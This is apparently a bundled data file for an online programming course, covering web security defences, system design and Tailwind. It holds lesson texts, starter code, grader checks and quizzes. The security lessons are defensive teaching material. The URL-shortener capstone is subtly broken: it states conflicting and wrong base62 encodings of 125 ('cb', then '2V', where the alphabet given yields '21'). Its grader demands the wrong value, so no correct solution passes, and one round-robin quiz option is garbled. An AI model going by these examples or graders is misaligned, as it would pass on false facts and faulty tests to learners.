  attempts = attempts + 1;
  return pw === "s3cret" ? "welcome" : "denied";
}
console.log(login("a"), login("b"), login("c"));
attempts = 0;                      // oops: counter resets
console.log(login("d"), login("e"), login("f"), login("s3cret"));`,options:["denied denied denied locked — six guesses total","denied denied denied welcome — the reset let a 4th+ guess through","denied denied denied denied — the lock held","welcome on the first try"],answer:1,explanation:"State that attackers can influence (a reset counter, a client-side lock) is broken state. Real limiters rate-limit by IP+account server-side and fail closed."}],quiz:[{q:"CSRF tricks the browser into…",options:["Revealing the user's passwords to evil.com","Sending an authenticated request with the user's cookies, from another site","Injecting JavaScript into the page","Downloading malware"],answer:1,explanation:"The attacker abuses ambient credentials (cookies), not access to the page itself."},{q:"Which cookie attribute most directly blunts CSRF?",options:["Path=/","SameSite=Lax or Strict","Domain","Max-Age=0"],answer:1,explanation:"SameSite tells the browser to withhold the cookie on cross-site requests, so forged requests arrive anonymous."},{q:"Why bcrypt over SHA-256 for passwords?",options:["bcrypt output is shorter","bcrypt is intentionally slow and salted — cheap to verify, expensive to brute-force","SHA-256 is deprecated","bcrypt compresses the password"],answer:1,explanation:"Fast hashes help attackers; slow, salted hashes are the correct design for secrets that must resist guessing."},{q:"HttpOnly on a session cookie means:",options:["Only HTTP (not HTTPS) requests may send it","JavaScript cannot read it, but the browser still sends it","The cookie expires after one request","The cookie is encrypted"],answer:1,explanation:"It removes the cookie from document.cookie reach, blinding XSS payloads — the browser keeps sending it with requests."},{q:"A state-changing action must never be reachable by:",options:["POST with a CSRF token","GET with no token","PATCH with SameSite cookies","PUT with an Origin check"],answer:1,explanation:"GETs are 'safe' by spec — preloaded by browsers, embeddable as images — so they must never mutate state."}]},{id:"cors-headers",title:"CORS, CSP & Security Headers",minutes:9,body:`**The Same-Origin Policy (SOP)** is the browser's core rule: a page from \`app.com\` cannot *read* responses from \`api.com\` unless the response explicitly allows it. This is a feature — it's why evil.com can't silently read your webmail.

**CORS — Cross-Origin Resource Sharing** — is the *controlled* way to relax SOP. The server, not the client, decides:

\`\`\`
Access-Control-Allow-Origin: https://app.com      # who may read me
Access-Control-Allow-Methods: GET, POST, PATCH    # what they may do
Access-Control-Allow-Headers: Content-Type        # what they may send
Access-Control-Allow-Credentials: true            # may send cookies too
\`\`\`

The two classic misconfigurations:

\`\`\`
# ❌ reflecting any origin — SOP with a hole the size of the internet
Access-Control-Allow-Origin: <request's Origin header>

# ❌ "allow everything" combined with credentials — browsers refuse it,
#    and misconfigured proxies enforce it instead
Access-Control-Allow-Origin: *     + Allow-Credentials: true
\`\`\`

Reflecting arbitrary origins means any site can read your API *with the victim's cookies* — CSRF's quieter cousin. Allow the origins you actually own, exactly.

**CSP — Content-Security-Policy** — is the page's bouncer for its *own* content. A header like:

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
\`\`\`

tells the browser to refuse scripts from anywhere else — turning even a successful XSS injection into a script that never runs. CSP is a *second line of defense*: render correctly first, then CSP catches what slips through.

**The supporting cast, in one breath:** \`X-Content-Type-Options: nosniff\` (don't second-guess Content-Types), \`X-Frame-Options: DENY\` / \`frame-ancestors\` (no clickjacking iframes), \`Referrer-Policy\` (leak less), \`Strict-Transport-Security\` (HTTPS forever after).`,predict:[{prompt:"Which fetch passes the browser's CORS check?",code:`function corsCheck(allowOrigin, origin) {
  if (allowOrigin === "*") return "allowed (no credentials)";
  if (allowOrigin === origin) return "allowed (exact match)";
  return "blocked by CORS";
}
console.log(corsCheck("https://app.com", "https://app.com"));
console.log(corsCheck("https://app.com", "https://evil.com"));
console.log(corsCheck("*", "https://anything.io"));`,options:["Only the first is allowed","First and third — * allows everyone","All three are allowed","None — CORS blocks by default"],answer:1,explanation:"An exact match passes; * passes for non-credentialed requests; a mismatched exact origin is blocked. evil.com sees only rejection."}],quiz:[{q:"CORS decisions are made by:",options:["The client, via request headers","The server, via response headers","The DNS provider","The CDN automatically"],answer:1,explanation:"Only the server's Access-Control-* response headers can relax the browser's same-origin default."},{q:"Why is reflecting the request's Origin with credentials dangerous?",options:["It breaks caching","Every site — including attackers' — becomes an allowed reader of authenticated responses","It disables HTTPS","It exposes the database"],answer:1,explanation:"Any origin then passes the check, so evil.com can read the victim's data cross-origin."},{q:"CSP primarily protects against:",options:["Slow lighthouse scores","Injected scripts that would otherwise execute (e.g. XSS)","SQL injection","Expired TLS certificates"],answer:1,explanation:"script-src allowlists block injected scripts from running — a backstop behind correct rendering."},{q:"'Access-Control-Allow-Origin: *' together with 'Access-Control-Allow-Credentials: true' is:",options:["The most compatible configuration","Forbidden by the spec — and a red flag anywhere it's forced to work","Required for SPAs","Only for subdomains"],answer:1,explanation:"The spec refuses wildcard origins on credentialed requests; code that reflects instead is the real-world hazard."},{q:"X-Frame-Options: DENY defends against:",options:["Clickjacking via invisible iframes","Cookie theft","DNS spoofing","Brute-force login"],answer:0,explanation:"Framing protection stops your UI being overlaid by attacker chrome that captures clicks."}]},{id:"rate-limit-secrets",title:"Rate Limiting & Secret Management",minutes:9,body:`**Rate limiting** caps how often a client may call an endpoint — the difference between a login form and a password-cracking service. Every unauthenticated endpoint (login, register, password reset, search) is an invitation unless it's limited.

**The fixed-window algorithm in 10 lines:**

\`\`\`
const buckets = new Map();              // key → { count, windowStart }
function allow(key, limit, windowMs, now = Date.now()) {
  let b = buckets.get(key);
  if (!b || now - b.windowStart >= windowMs) {
    b = { count: 0, windowStart: now };
  }
  b.count += 1;
  buckets.set(key, b);
  return b.count <= limit;
}
\`\`\`

Key it by IP + route (and by account for logins), return **429 Too Many Requests** with a \`Retry-After\` header, and fail *closed* — a limiter that errors open is a limiter that doesn't exist. Window counters are the simple version; token buckets smooth bursts better, but the concept carries.

**Secret management** — the discipline of never hard-coding credentials:

\`\`\`
// ❌ committed, versioned forever, in every clone
const db = connect({ password: "hunter2-prod" });

// ✅ injected at runtime
const db = connect({ password: process.env.DATABASE_PASSWORD });
\`\`\`

Rules that save careers: secrets live in environment variables or a secret manager, never in git (a leaked key is compromised *forever* — rewriters can't un-leak caches); different secrets per environment; least-privilege keys (a read-only key can't drop tables); rotate after staff changes; and the frontend owns **no** secrets — anything shipped in a bundle is public. When a browser app needs a paid API, it calls *your* backend, which holds the key.

This lesson's sandbox builds both: a working limiter and a config module that refuses to boot without its secrets.`,starter:`// ─── 1 · Build a fixed-window rate limiter ───────────
const buckets = new Map();
function allow(key, limit, windowMs, now = Date.now()) {
  let b = buckets.get(key);
  if (!b || now - b.windowStart >= windowMs) {
    b = { count: 0, windowStart: now };
  }
  b.count += 1;
  buckets.set(key, b);
  return b.count <= limit;
}

const t0 = 1_000_000;
console.log("login attempts 1-3:", [1, 2, 3].map((i) => allow("ip1:login", 3, 60_000, t0 + i)));
console.log("attempt 4:", allow("ip1:login", 3, 60_000, t0 + 4));
console.log("other IP still fine:", allow("ip2:login", 3, 60_000, t0 + 5));
console.log("after window resets:", allow("ip1:login", 3, 60_000, t0 + 61_000));

// ─── 2 · Guard an endpoint with it ───────────────────
function handleLogin(ip, pw) {
  if (!allow(ip + ":login", 3, 60_000)) return "429 Too Many Requests";
  return pw === "s3cret" ? "200 welcome" : "401 denied";
}
for (let i = 0; i < 4; i++) console.log("try:", handleLogin("9.9.9.9", "nope"));

// ─── 3 · Config that fails closed ────────────────────
function loadConfig(env) {
  const required = ["DATABASE_URL", "JWT_SECRET", "STRIPE_KEY"];
  const missing = required.filter((k) => !env[k]);
  if (missing.length) {
    throw new Error("missing env vars: " + missing.join(", "));
  }
  return { dbUrl: env.DATABASE_URL, jwtSecret: "***set***", stripe: "***set***" };
}
try {
  console.log(loadConfig({ DATABASE_URL: "postgres://…", JWT_SECRET: "abc", STRIPE_KEY: "sk_…" }));
  console.log(loadConfig({ DATABASE_URL: "postgres://…" }));
} catch (e) {
  console.log("boot refused:", e.message);
}

// ─── YOUR TURN: detect a hard-coded secret ───────────
// Return true if the code string embeds a key-looking literal
// (sk_live_, AKIA, ghp_, or password = "...").
function hasHardcodedSecret(code) {
  // your code — one regex, four alternatives
  return false;
}
console.log(hasHardcodedSecret('const k = "sk_live_9u2h3k";'));  // true
console.log(hasHardcodedSecret('const k = process.env.STRIPE_KEY;')); // false`,check:{expr:"output.includes('attempt 4: false') && output.includes('after window resets: true') && output.includes('429 Too Many Requests') && output.includes('missing env vars: JWT_SECRET, STRIPE_KEY') && output.includes('true') && output.includes('false')",hint:`hasHardcodedSecret: /(sk_live_|AKIA|ghp_|password\\s*=\\s*['\\"])/.test(code).`},quiz:[{q:"Rate limiting exists to prevent:",options:["Slow page loads","Brute-force and abuse of endpoints (credential stuffing, scraping, spam)","CORS errors","Indexing by search engines"],answer:1,explanation:"Caps per client make bulk guessing and scraping economically pointless."},{q:"The right HTTP status for a throttled request is:",options:["403 Forbidden","429 Too Many Requests","500 Internal Server Error","302 Found"],answer:1,explanation:"429 says 'you, specifically, are asking too often' — usually with Retry-After."},{q:"A rate limiter should fail:",options:["Open — availability over safety","Closed — an erroring limiter must not become a free pass","Either — it doesn't matter","Only on weekends"],answer:1,explanation:"Failing open turns every outage into an open door; a brief hard-fail beats unlimited abuse."},{q:"Secrets belong:",options:["In config.js, it's gitignored anyway","In environment variables / a secret manager, injected at runtime","In localStorage","In the frontend bundle, encrypted"],answer:1,explanation:"Env vars/secret managers keep secrets out of version history and out of shipped bundles."},{q:"A browser app needs a paid third-party API. The safe pattern is:",options:["Put the API key in the JS bundle","Proxy through your own backend, which holds the key server-side","Ask users for the key","Hard-code it with light obfuscation"],answer:1,explanation:"Anything in the bundle is public; a server-side proxy is the standard gate."}]}]},MP={id:"architecture",title:"System Design & Architecture",blurb:"Scale, cache, shard, and queue — the trade-off thinking behind big systems.",numeral:"Ⅹ",lessons:[{id:"monolith-vs-microservices",title:"Monoliths vs. Microservices",minutes:11,reading:!0,body:`**Every system starts as a monolith** — one deployable app holding all the code. That's not a sin; it's the correct default. One repo, one deploy, one log file, function calls instead of network calls. Instagram served tens of millions of users on a monolith.

**The monolith's breaking points:**
- deploys become scary — one shared codebase means one bad change blocks everyone
- scaling is all-or-nothing — need more image-resizing capacity? You scale *everything*
- a memory leak in one feature can take down the whole process

**Microservices split the system along business lines** — each service owns its data, deploys independently, and talks to the others over the network:

\`\`\`
        ┌────────────┐
        │   gateway  │
        └─────┬──────┘
   ┌──────────┼──────────┐
┌──┴───┐  ┌───┴──┐  ┌────┴───┐
│users │  │orders│  │ emails │      each with its own DB
└──────┘  └──────┘  └────────┘
\`\`\`

**What you buy:** independent deploys (small blast radius), independent scaling (scale only the hot service), tech freedom per service, team ownership boundaries.

**What you pay — and it's steep:**
- every function call becomes a network call: latency, retries, timeouts, partial failure
- distributed transactions are gone — you get eventual consistency instead
- distributed tracing, service discovery, and deployment tooling become mandatory
- debugging spans machines; "the bug" now lives in the seams

**The honest rule of thumb:** start with a modular monolith — one deploy, but with strict internal module boundaries. Extract a service only when a specific force (scaling, team size, deploy contention) demands it. *You can't understand microservices until you've felt the pain microservices solve — and you can't feel it until you've built a monolith.*

**Trade-off analysis framework** for any architecture question:
1. What does the traffic look like? (read-heavy? spiky? latency-sensitive?)
2. What must be strongly consistent vs. eventually consistent?
3. Where is the team's bottleneck — people or machines?
4. What's the simplest design that survives failure of ONE component?`,quiz:[{q:"The correct default for a new product is usually:",options:["A microservice per feature, ready for scale","A modular monolith — one deploy with strict internal boundaries","No architecture at all","Serverless functions only"],answer:1,explanation:"Function calls beat network calls on cost, latency, and debugging until real forces demand extraction."},{q:"The biggest tax microservices introduce is:",options:["Slower CPUs","Network calls replace function calls — latency, retries, and partial failure everywhere","Larger repositories","Inability to use databases"],answer:1,explanation:"Distributed systems trade call reliability for deploy independence — that's the deal."},{q:"In microservices, each service typically:",options:["Shares one giant database for consistency","Owns its data store and exposes it via an API","Runs on the same process","Must use the same language"],answer:1,explanation:"Shared databases couple services as tightly as shared code — the data boundary IS the service boundary."},{q:"A good reason to extract a service:",options:["Microservices look good on a résumé","One module has wildly different scaling needs or blocks others' deploys","The codebase feels big","A consultant recommended it"],answer:1,explanation:"Extract on concrete forces: scaling hotspots, deploy contention, team ownership — never on aesthetics."},{q:"'Eventual consistency' means:",options:["The database is eventually fast","Replicas converge to the same value after a delay — reads may briefly disagree","Writes are queued forever","Transactions are impossible"],answer:1,explanation:"Cross-service writes commit independently; the system guarantees convergence, not instant agreement."}]},{id:"caching-and-redis",title:"Caching & Redis (with an LRU exercise)",minutes:14,body:`**Caching is the one scaling lever that shows up in every system design.** The insight: data is usually *requested* far more often than it *changes* — so keep the hot answers close.

**The layers, from the user inward:**
\`\`\`
browser cache  →  CDN  →  app-level cache (Redis)  →  database
\`\`\`
Each hop is faster and more expensive to invalidate. The database is always the last resort.

**Redis in one paragraph:** an in-memory data store — sub-millisecond reads — with strings, hashes, lists, sets, and sorted sets, plus TTLs. Typical jobs: caching DB queries, storing sessions, rate-limit counters, leaderboards (sorted sets!), and pub/sub.

**The cache patterns you must name:**

\`\`\`
Cache-aside (the default):
  read:  cache hit?  return it
         cache miss? read DB → store in cache → return
  write: write DB → invalidate the cache key

Write-through:
  write: write cache AND DB together
  reads are always warm; writes are slower

TTL on everything:
  every key gets an expiry — the safety net when invalidation logic has a bug
\`\`\`

**Cache-aside's classic problems:**
- **Stale reads** — data changed but the cache wasn't invalidated. Mitigate with short TTLs or event-driven invalidation.
- **The thundering herd** — a hot key expires and a thousand requests hit the DB at once. Mitigate with jittered TTLs or request coalescing.
- **Penetrating queries** — requests for keys that *never* exist (attackers love these) skip the cache and slam the DB. Cache the empty result briefly, or bloom-filter.

**What belongs in a cache:** expensive, mostly-stable, read-heavy results. **What doesn't:** anything where a stale answer costs money (balances, inventory at checkout) or personal data with hard privacy rules.

This lesson's exercise: build an **LRU cache** — the data structure behind every real cache's memory limit — with O(1) get and put. Hash map for lookup, doubly-linked list for recency order. It's also a top-5 interview question.`,starter:`// Build an LRU cache — O(1) get & set.
// A Map in JS preserves insertion order, so "oldest = first key".
// On every ACCESS, delete + re-set the key to mark it most-recent.
// When over capacity, evict the FIRST key (the least recently used).

class LRUCache {
  constructor(capacity) {
    this.capacity = capacity;
    this.map = new Map();
  }
  get(key) {
    if (!this.map.has(key)) return -1;
    const value = this.map.get(key);
    // TODO: refresh recency — delete the key, re-set it with the value
    return value;
  }
  put(key, value) {
    // TODO: if the key exists, delete it first (so re-set moves it to the end)
    // then set it; if size > capacity, evict the FIRST key:
    //   const oldest = this.map.keys().next().value;
    //   this.map.delete(oldest);
  }
  keys() {
    return [...this.map.keys()];
  }
}

const c = new LRUCache(2);
c.put("a", 1);
c.put("b", 2);
console.log("get a (hit):", c.get("a"));       // 1
c.put("c", 3);                                  // evicts the LRU: "b"
console.log("get b (evicted):", c.get("b"));   // -1
console.log("order is now:", c.keys().join(",")); // a,c
c.get("a");                                     // touch a → a becomes MRU
c.put("d", 4);                                  // evicts "c"
console.log("get c (evicted):", c.get("c"));   // -1
console.log("order is now:", c.keys().join(",")); // a,d
console.log("final size (must be 2):", c.keys().length);`,check:{expr:"output.includes('get a (hit): 1') && output.includes('get b (evicted): -1') && output.includes('order is now: a,c') && output.includes('get c (evicted): -1') && output.includes('order is now: a,d') && output.includes('final size (must be 2): 2')",hint:"get: if missing return -1, else delete(key) then set(key, value) and return it. put: delete existing key first, set it, then while map.size > capacity delete the first key."},quiz:[{q:"The default cache pattern — read cache, fall back to DB, backfill — is called:",options:["Write-through","Cache-aside","Read-repair","Write-behind"],answer:1,explanation:"Cache-aside keeps the DB the source of truth and treats the cache as a disposable accelerator."},{q:"After writing new data, cache-aside usually:",options:["Rewrites the whole cache","Invalidates the affected key so the next read repopulates it","Doubles the TTL","Writes to a second database"],answer:1,explanation:"Invalidate, don't update: the next read fetches fresh data and re-fills the key."},{q:"A TTL exists to:",options:["Make the cache faster","Bound staleness — keys expire so old data can't live forever","Compress values","Count requests"],answer:1,explanation:"Even perfect invalidation code gets a TTL safety net; the two mechanisms cover each other."},{q:"A hot key expires and thousands of requests hit the DB simultaneously. That's:",options:["The thundering herd — mitigate with jittered TTLs or request coalescing","A cache hit","Write amplification","Sharding"],answer:0,explanation:"Jitter spreads expirations out; coalescing lets one flight repopulate for everyone."},{q:"Why does the LRU exercise use delete + re-set on every access?",options:["It looks cleaner","JS Maps keep insertion order — re-inserting moves the key to the 'most recent' end in O(1)","It compresses values","Maps don't allow updates"],answer:1,explanation:"Insertion order IS the recency order — the trick that makes LRU O(1) without a hand-rolled linked list."}]},{id:"load-balancing",title:"Load Balancing & Horizontal Scaling",minutes:10,reading:!0,predict:[{prompt:"Round-robin over 3 servers — which requests hit server B?",code:`const servers = ["A", "B", "C"];
let i = 0;
function pick() {
  const s = servers[i % servers.length];
  i = i + 1;
  return s;
}
console.log([1,2,3,4,5,6].map(pick).join(""));`,options:["ABCABС — wait, that's every position 2 and 5","B and E only — positions 2 and 5","BB","All hit B"],answer:1,explanation:"i%3 cycles 0,1,2 — B serves requests 2 and 5. (Careful with look-alike characters in options — another reason to always verify by running!)"}],body:`**Vertical scaling** buys a bigger box. **Horizontal scaling** buys more boxes — and the moment you have more than one, something must decide who gets each request. That's the load balancer.

\`\`\`
                    ┌── server 1
client → LB (VIP) ──┼── server 2
                    └── server 3
\`\`\`

**Strategies:**
- **Round robin** — rotate through the list. Simple, fair for identical requests.
- **Least connections** — send work to whoever is least busy. Better when request durations vary wildly.
- **Consistent hashing** — hash the request key (user id, session) onto a ring of servers so the same key lands on the same server — crucial when servers hold state (sticky sessions, caches). Its magic: adding/removing a server moves only ~1/N of the keys, not all of them.
- **Weighted** — beefier machines take proportionally more traffic during a migration.

**The prerequisite for any of this: your servers must be stateless.** No sessions in local memory, no files on local disk. State goes to Redis/a database/object storage. Then any server can serve any request, and a dead one loses nothing.

**Health checks are what make an LB an LB:** it probes each backend (say, \`GET /health\`) and routes around failures automatically. Combined with autoscaling (add instances above a CPU/queue threshold, remove below it), you get a fleet that heals and breathes on its own.

**Where LBs live:** a hardware/virtual appliance (nginx, HAProxy, cloud LBs), or DNS-level (multiple A records — cruder, slower to fail over). Most production stacks use a managed cloud LB in front of an autoscaling group.`,quiz:[{q:"Horizontal scaling requires servers to be:",options:["Written in Go","Stateless — any instance can serve any request","Physically adjacent","Single-threaded"],answer:1,explanation:"State in Redis/DB/object storage; instances become interchangeable cattle, not pets."},{q:"Least-connections beats round-robin when:",options:["Servers are identical","Request durations vary a lot — some requests hog a server for seconds","There's only one server","Traffic is constant"],answer:1,explanation:"Round robin assumes uniform cost; least connections routes around slow in-flight requests."},{q:"Consistent hashing's key property:",options:["It's faster than modulo","Adding/removing a server remaps only ~1/N of keys, not everything","It encrypts traffic","It only works with 2 servers"],answer:1,explanation:"The hash ring keeps most key→server assignments stable across topology changes — why caches and shards love it."},{q:"Health checks let the load balancer:",options:["Encrypt requests","Automatically stop routing to failed backends","Store sessions","Compress responses"],answer:1,explanation:"Probe /health, eject the dead — the mechanism behind self-healing fleets."},{q:"Sticky sessions are usually a smell because:",options:["They're slower to configure","They bind users to one server — killing the stateless property horizontal scaling needs","Cookies are deprecated","LBs can't support them"],answer:1,explanation:"Prefer server-side shared state; stickiness only as a legacy-system crutch."}]},{id:"websockets-realtime",title:"WebSockets & Real-Time Systems",minutes:10,reading:!0,body:`HTTP is a **request–response** protocol: the client asks, the server answers, the connection ends. Fine for pages. Terrible for *live* data — a chat app polling every second is a thousand wasted requests per user per minute, plus up-to-a-second latency.

**WebSockets upgrade one HTTP connection into a persistent, bidirectional pipe:**

\`\`\`
GET /chat HTTP/1.1
Upgrade: websocket
Connection: Upgrade

…101 Switching Protocols…

server ⇄ client    (either side can push, instantly, for as long as it stays open)
\`\`\`

**The model shift:** the server no longer waits to be asked — it *pushes*. That's what powers chat, collaborative editing, live dashboards, multiplayer games, and trading UIs.

**Scaling WebSockets is the interesting part.** A connection is state that lives on ONE server — the exact thing horizontal scaling hates. 10,000 concurrent connections spread over 10 servers: when Ada (on server 2) sends a message meant for Sam (on server 7), server 2 can't just "send it to everyone".

\`\`\`
The standard solution — a pub/sub backbone:

server 1 ─┐
server 2 ─┼── Redis pub/sub (or Kafka) ── every server subscribes
server 3 ─┘

Ada's message → server 2 publishes to "chat:room1"
               → Redis fans out to all subscribed servers
               → whichever server holds Sam's socket delivers it
\`\`\`

**Production realities:**
- **Heartbeats** — dead connections are invisible; ping/pong every ~30s detects them
- **Reconnection with backoff** — mobile networks drop constantly; clients must retry (1s, 2s, 4s…) and re-sync missed state
- **Fan-out cost** — a message to a 50k-member room is 50k sends; that's where queueing and batching earn their keep
- Alternatives: **SSE** (server→client only, dead simple, auto-reconnects) for one-way feeds, and managed services (Pusher/Ably/Firebase) when running socket infrastructure isn't your product`,quiz:[{q:"Compared to HTTP polling, WebSockets give you:",options:["Faster DNS","A persistent bidirectional connection — push instead of repeated ask","Better SEO","Free scaling"],answer:1,explanation:"One upgrade handshake, then either side pushes instantly — no request overhead per message."},{q:"Why is a WebSocket hard to load-balance naively?",options:["It uses UDP","The connection is long-lived state bound to one server","Browsers forbid it","It can't be encrypted"],answer:1,explanation:"Sam's socket lives on server 7 — requests can't just round-robin anymore."},{q:"The standard scaling backbone for socket servers is:",options:["A bigger server","A pub/sub layer (Redis/Kafka) that fans messages out to every server","DNS round robin","Client-side routing"],answer:1,explanation:"Publish once; every server receives and delivers to the sockets it holds."},{q:"Heartbeats (ping/pong) exist because:",options:["They speed up messages","Dead TCP connections look alive — you must detect and clean them up","TLS requires them","Browsers send them automatically"],answer:1,explanation:"Without pings, half-open connections accumulate and 'online users' is a lie."},{q:"A one-way server→client feed (notifications, tickers) can use — simpler than WebSockets:",options:["FTP","Server-Sent Events (SSE)","SSH","SMTP"],answer:1,explanation:"SSE is plain HTTP, auto-reconnects, and covers the server-push-only case."}]},{id:"sharding-and-queues",title:"Database Sharding & Message Queues",minutes:11,reading:!0,predict:[{prompt:"Sharding by user_id % 4 — where does user 7's data live, and why is this scheme brittle?",code:`function shard(userId, count) {
  return userId % count;
}
console.log("user 7 → shard", shard(7, 4));
console.log("add a shard (5) and user 7 lands on:", shard(7, 5));`,options:["user 7 → shard 3; with 5 shards it's still 3 — nothing moves","user 7 → shard 3; add a shard and it moves to 2 — almost every key remaps","user 7 → shard 0 always","Sharding changes the data, not the location"],answer:1,explanation:"Naive modulo remaps nearly everything when the shard count changes — consistent hashing or a lookup tier fixes this."}],body:`**One PostgreSQL box tops out** — connections, RAM, disk IOPS. Replication adds read capacity but every write still hits the primary. When writes are the bottleneck, you **shard**: split the data across independent databases, each owning a slice.

\`\`\`
                  ┌─ shard 0: users where hash(id) % 4 = 0
app → router/tier ┼─ shard 1: hash % 4 = 1
                  ├─ shard 2: hash % 4 = 2
                  └─ shard 3: hash % 4 = 3
\`\`\`

**Shard key choice is the whole game:**
- **By user id** — all of one user's data co-located; queries without the user id (admin dashboards) must fan out to every shard
- **By tenant** — great for B2B, terrible if one customer is a whale (hot shard)
- **By hash of the key** — even distribution, but range queries die

**What you lose the moment you shard:** cross-shard joins, global unique constraints, and single-node transactions. Resharding (moving data when you outgrow N shards) is one of the most painful operations in the industry — which is why consistent hashing or directory-based routing exists, and why teams defer sharding until *proven* to need it.

**Message queues solve a different axis: coupling over time.** Instead of service A calling service B synchronously (B must be up, fast, and A must wait), A *publishes an event* and gets on with life:

\`\`\`
checkout service ──publish "order.placed"──▶ [ RabbitMQ / Kafka ]
                                                   │
                     ┌─────────────┬───────────────┼──────────┐
                 email worker  invoice worker  analytics   fraud check
\`\`\`

**What the queue buys:**
- **Decoupling** — add a consumer without touching the publisher
- **Buffering** — a 10× traffic spike queues up instead of melting downstream services
- **Retry & dead-letter** — a failed email job retries; after N failures it goes to a dead-letter queue for humans
- **Independent scaling** — run 30 email workers, 2 invoice workers

**The trade:** everything becomes eventually consistent ("your order is confirmed" while the invoice hasn't run yet), and you need idempotent consumers — the same message may be delivered more than once. At-least-once delivery is the norm; design for duplicates, not against them.`,quiz:[{q:"Sharding differs from replication because sharding:",options:["Adds read replicas","Splits DIFFERENT rows across different databases","Compresses the database","Is only for MongoDB"],answer:1,explanation:"Replicas hold copies for reads; shards hold partitions for write scale."},{q:"The single most important sharding decision:",options:["Database engine version","The shard key — it fixes which data lives together and which queries fan out","Disk brand","Programming language"],answer:1,explanation:"A bad shard key creates hot shards and cross-shard queries; changing it later means migrating everything."},{q:"Naive `id % N` sharding is brittle because:",options:["Modulo is slow","Changing N remaps nearly every key — a full-data migration","It requires SQL","It leaks PII"],answer:1,explanation:"Consistent hashing moves only ~1/N of keys when the topology changes."},{q:"A message queue decouples services in:",options:["Space only","Time — the producer doesn't wait, consumers process later, independently","Encryption strength","Neither — it's just faster HTTP"],answer:1,explanation:"Publish-and-forget: producers survive consumer outages and spikes are buffered."},{q:"Why must queue consumers be idempotent?",options:["It's a style rule","Delivery is at-least-once — duplicates happen, and processing one twice must be harmless","Queues delete old messages","Consumers are single-threaded"],answer:1,explanation:"Exactly-once is a myth in practice; idempotency (upserts, dedupe keys) makes duplicates safe."}]},{id:"capstone-system-design",title:"Capstone: Design a URL Shortener (in code)",minutes:16,body:`Interviews and real life both test the same skill: turning a vague product into a concrete design, then defending the trade-offs. You'll do it here for real — a **URL shortener** like bit.ly, and you'll implement its heart.

**Step 1 — requirements, made explicit:**
\`\`\`
shorten(longUrl) → short code         (write-heavy at creation)
resolve(code)    → longUrl            (read-heavy: ~100:1 vs writes)
codes are permanent, redirects return 301/302
\`\`\`

**Step 2 — the ID question, the crux of the design.** Don't hash the URL (collisions + the same URL wastes a slot). **Count and encode**: every new URL gets an auto-increment ID; encode it in **base62** (\`0-9, a-z, A-Z\` — 62 digits). ID 125 → \`"cb"\`. 62² = 3,844 URLs in two characters; six characters covers ~56 *billion*.

\`\`\`
125 → base62 → "cb"     decode("cb") → 125 → SELECT url FROM links WHERE id=125
\`\`\`

**Step 3 — the pieces around it:**
- **Cache** the hot codes in Redis (cache-aside) — reads dominate 100:1
- **A 301** tells browsers "permanent — cache the redirect"; a **302** keeps analytics flowing. Trade-off, not rule.
- **Analytics** go to a queue (async), never inline in the redirect path
- **Custom aliases** = a uniqueness check on insert; the encode scheme stays untouched

**The same skeleton solves real-time chat** (rooms = keys, message fan-out via pub/sub), **pastebin** (content = the value), **rate limiter** (counters in Redis) — that's why interviewers love it: it's a *pattern*, not a puzzle.

**Your exercise:** implement base62 encode + decode, prove they round-trip, and build the tiny in-memory store with a cache in front. Getting \`encode(decode(x)) === x\` for a hundred thousand IDs is the acceptance test.`,starter:`// ─── The heart of bit.ly: base62 IDs ─────────────────
const ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

function encode(id) {
  // TODO: repeatedly take id % 62 for the next digit (right to left),
  // then integer-divide by 62; join the characters.
  // encode(0) must be "0". encode(125) must be "2V"... check ALPHABET[2]="2", ALPHABET[38]="V"
  return "";
}

function decode(code) {
  // TODO: for each character: id = id * 62 + ALPHABET.indexOf(char)
  return 0;
}

// ─── Round-trip proof: the acceptance test ───────────
let bad = 0;
for (let id = 0; id < 100_000; id++) {
  if (decode(encode(id)) !== id) bad++;
  if (bad > 3) break;
}
console.log("round-trip failures:", bad);            // 0
console.log("encode(125):", encode(125));            // 2V
console.log("decode('2V'):", decode("2V"));          // 125
console.log("encode(61):", encode(61));              // Z

// ─── The store + cache, wired up ─────────────────────
const store = new Map();            // id → url  (stand-in for the DB)
const cache = new Map();            // code → url (stand-in for Redis)
let dbReads = 0;
function saveUrl(url) {
  const id = store.size;
  store.set(id, url);
  return encode(id);
}
function resolveUrl(code) {
  if (cache.has(code)) return cache.get(code);
  dbReads++;
  const url = store.get(decode(code));
  cache.set(code, url);
  return url;
}
const short = saveUrl("https://example.com/very/long/path");
console.log("short code:", short);
console.log("first read (DB hit):", resolveUrl(short));
console.log("second read (cached):", resolveUrl(short));
console.log("db reads for 2 resolves:", dbReads);   // 1`,check:{expr:`output.includes('round-trip failures: 0') && output.includes('encode(125): 2V') && output.includes("decode('2V'): 125") && output.includes('encode(61): Z') && output.includes('db reads for 2 resolves: 1')`,hint:"encode: while (id > 0) { out = ALPHABET[id % 62] + out; id = Math.floor(id / 62); } — guard id === 0 → '0'. decode: for each char, id = id * 62 + ALPHABET.indexOf(ch)."},quiz:[{q:"Why encode auto-increment IDs instead of hashing the URL?",options:["Hashing is slower to compute","Sequential IDs are collision-free and dense — base62 codes stay short and deterministic","Hashes are not secure","Databases require numeric keys"],answer:1,explanation:"Hash collisions force collision-handling; counter+encode gives every URL a unique, short code for free."},{q:"Base62 (not base64) is used for short codes because:",options:["It's shorter per character","It's URL-safe — no +, /, or = that need escaping","62 is a power of two","Databases only sort lowercase"],answer:1,explanation:"Alphanumeric-only codes survive URLs, QR codes, and humans reading them aloud."},{q:"A 301 redirect instead of 302:",options:["Is always correct","Tells browsers to cache permanently — faster, but you lose per-click analytics","Is required by base62","Hides the long URL"],answer:1,explanation:"301 = permanent (browser caches, your analytics go dark); 302 = temporary (every click hits you). Know which you're choosing."},{q:"Click analytics should be recorded:",options:["Inline inside the redirect handler","Asynchronously via a queue, keeping the redirect path fast","In localStorage","Never"],answer:1,explanation:"The hot path does one thing: redirect. Everything else streams out through a queue."},{q:"The Redis cache in front of code→URL lookups pays off because:",options:["URLs are small","Reads outnumber writes ~100:1 — caching hot codes removes nearly all DB load","Redis is ACID","Codes are numeric"],answer:1,explanation:"Read-heavy + stable data = the textbook cache candidate, at the exact layer interviewers expect."}]}]},LP={id:"tailwind",title:"UI Engineering with Tailwind CSS",blurb:"Utility-first styling, responsive systems, and shipping a real component kit.",numeral:"Ⅺ",lessons:[{id:"utility-first",title:"Utility-First: The Mental Model",minutes:11,preview:{brief:"The card shell 